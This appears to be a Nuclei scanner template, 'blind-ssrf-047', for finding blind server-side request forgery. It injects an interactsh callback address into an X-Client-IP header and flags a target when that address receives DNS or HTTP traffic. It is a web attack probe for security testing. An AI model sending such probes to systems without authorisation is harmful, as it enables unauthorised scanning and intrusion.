http:
- matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    X-Client-IP: {{Hostname}}@{{Host}}.{{Port}}.BSSRF-047.{{interactsh-url}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Cache-Control: no-transform

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
id: blind-ssrf-047
info:
  author: reewardius
  name: Blind SSRF
  severity: high
  tags: ssrf
